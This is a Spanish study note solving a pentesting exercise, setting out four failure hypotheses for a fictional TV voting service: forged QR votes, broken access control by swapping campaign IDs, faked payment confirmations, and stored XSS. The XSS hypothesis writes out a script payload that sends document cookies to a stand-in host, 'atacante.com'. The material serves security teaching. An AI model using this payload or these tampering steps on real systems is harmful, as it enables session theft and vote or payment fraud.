> [!example] Enunciado
> Votame SRL (4 hipótesis de falla) — Votame SRL ofrece servicios de votación para productoras de TV. Los clientes se registran y crean campañas de votación (opciones, duración, tipo: telefónica o QR). Al crear una campaña vía QR se envía un código QR por opción. Los productores pueden ver votos, descalificar opciones, o pausar la campaña. El cobro es una suscripción mensual externa con límites de campañas/votos.
>
> Establecer 4 hipótesis de falla plausibles siguiendo la metodología de pentesting, con prueba concreta para cada una.

**Conceptos:**

* [[Metodología de Hipótesis de Falla]]
* [[Broken Access Control]]
* [[CWE-79 - XSS]]

**Hipótesis 1: Manipulación de votos a través del QR**
- **Qué:** Falsificación de códigos QR para inyectar votos masivos.
- **Por qué:** Si el QR simplemente contiene una URL tipo `GET /api/campania/{id}/opcion/{id}/votar`, cualquiera que la deduzca puede generar votos sin escanear el QR original.
- **Cómo:** Escanear el QR legítimo para obtener la URL, automatizar miles de requests a esa URL y verificar si el sistema acepta los votos sin límite por IP/dispositivo.
- **Impacto:** Manipular resultados de una votación televisiva.

**Hipótesis 2: [[Broken Access Control]] en gestión de campañas**
- **Qué:** Un productor puede acceder/modificar campañas de otro.
- **Por qué:** Si los endpoints solo verifican autenticación y no propiedad de la campaña, cualquier productor autenticado puede manipular campañas ajenas.
- **Cómo:** Interceptar el request de pausar la propia campaña y cambiar el `id_campania` por uno ajeno; probar también `POST /api/campania/{id_ajeno}/descalificar_opcion/{id}`.
- **Impacto:** Pausar campañas ajenas, descalificar opciones, espiar resultados de rivales.

**Hipótesis 3: Falsificación de confirmación de pago**
- **Qué:** Obtener el servicio sin pagar manipulando la respuesta del sistema de cobro externo.
- **Por qué:** Si el backend no valida que la notificación de pago viene realmente del sistema externo, se puede simular.
- **Cómo:** Interceptar con proxy y enviar directamente la confirmación exitosa sin completar el pago; probar también manipular el campo de cantidad de campañas/votos incluidos.
- **Impacto:** Usar el servicio sin pagar o exceder límites de la suscripción.

**Hipótesis 4: XSS a través de las opciones de voto**
- **Qué:** [[CWE-79 - XSS|Cross-Site Scripting]] almacenado en los nombres de las opciones.
- **Por qué:** Los nombres de opciones son texto libre mostrado en la interfaz; si no está sanitizado, se puede inyectar JavaScript.
- **Cómo:** Crear una campaña con una opción llamada `<script>fetch('https://atacante.com/?cookie='+document.cookie)</script>`.
- **Impacto:** Robar sesiones de otros productores o administradores.
